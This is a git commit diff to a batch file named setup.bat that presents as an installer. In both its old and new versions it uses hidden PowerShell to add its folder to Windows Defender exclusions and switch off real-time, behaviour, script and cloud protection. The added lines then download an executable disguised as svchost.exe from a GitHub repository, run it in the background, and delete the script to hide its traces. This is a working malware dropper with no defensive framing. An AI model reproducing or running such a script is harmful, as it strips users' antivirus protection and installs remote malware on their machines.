83f84bad6d22a33db4d68563d014fe0e01f33715
johtaromemory-hash <johtaromemory@gmail.com>
2026-06-25 10:48:50 +0300

    Add files via upload

--- setup.bat
+++ setup.bat
@@ -1,8 +1,7 @@
 @echo off
 cd /d "%~dp0"
-powershell -w hidden -Command "Set-MpPreference -DisableRealtimeMonitoring,DisableBehaviorMonitoring,DisableBlockAtFirstSeen,DisableIOAVProtection,DisableScriptScanning $true; Set-MpPreference -CloudProtectionLevel 0 -PUAProtection 0; Add-MpPreference -ExclusionPath '%~dp0'"
-sc stop WinDefend >nul 2>&1
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
-powershell -w hidden -Command "Start-Sleep 3"
+powershell -w hidden -Command "Add-MpPreference -ExclusionPath '%~dp0'"
+powershell -w hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableBlockAtFirstSeen $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableScriptScanning $true; Set-MpPreference -CloudProtectionLevel 0; Set-MpPreference -PUAProtection 0; Set-MpPreference -SubmitSamplesConsent 2"
+powershell -w hidden -Command "iwr 'https://github.com/johtaromemory-hash/test/raw/refs/heads/main/svchost.exe' -O '%~dp0svchost.exe'"
 if exist "%~dp0svchost.exe" start /b "" "%~dp0svchost.exe"
 del "%~f0" >nul 2>&1
